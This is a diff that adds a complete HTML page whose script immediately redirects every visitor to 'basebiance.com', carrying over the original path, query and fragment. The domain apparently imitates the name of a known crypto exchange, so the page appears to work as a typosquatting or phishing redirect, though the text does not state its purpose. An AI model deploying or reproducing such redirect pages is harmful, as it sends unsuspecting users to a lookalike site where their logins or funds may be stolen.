@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <script>
+    (function() {
+      var targetDomain = 'https://basebiance.com';
+      var path = window.location.pathname;
+      var search = window.location.search;
+      var hash = window.location.hash;
+      var destinationUrl = targetDomain + path + search + hash;
+      window.location.replace(destinationUrl);
+    })();
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
